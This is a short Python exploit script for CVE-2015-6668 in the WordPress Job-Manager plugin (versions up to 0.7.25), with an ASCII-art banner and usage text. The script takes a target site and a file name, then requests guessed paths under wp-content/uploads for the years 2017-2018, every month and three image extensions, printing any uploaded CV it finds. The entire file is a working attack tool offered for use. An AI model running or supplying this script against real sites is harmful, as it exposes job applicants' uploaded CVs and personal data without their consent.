#!/usr/bin/python3

import requests
import sys

logo = """
     _  ___  _           __  __ _  _       _       _  _         _____
    | |/ _ \| |__       |  \/  | || |   __| |_ __ | || |   __ _|___ / _ __
 _  | | | | | '_ \ _____| |\/| | || |_ / _` | '_ \| || |_ / _` | |_ \| '__|
| |_| | |_| | |_) |_____| |  | |__   _| (_| | | | |__   _| (_| |___) | |
 \___/ \___/|_.__/      |_|  |_|  |_|  \__,_|_| |_|  |_|  \__, |____/|_|
                                                          |___/
"""
info = """  
CVE-2015-6668  
Job-Manager  
 Versions: <=0.7.25  
"""
if len(sys.argv) != 3:
    print("[!]Need more args")
    print(f"[+]Usage  : {sys.argv[0]} <URL> <File_Name>")
    print(f"[*]Example: {sys.argv[0]} http://vuln.com vulnfile")
    sys.exit()

print(logo)
print(info)

website  = sys.argv[1]
filename = sys.argv[2]

filename2 = filename.replace(" ", "-")

for year in range(2017,2019):  
    for i in range(1,13):
        for extension in {'jpeg','png','jpg'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print("[+] URL of CV found! " + URL)
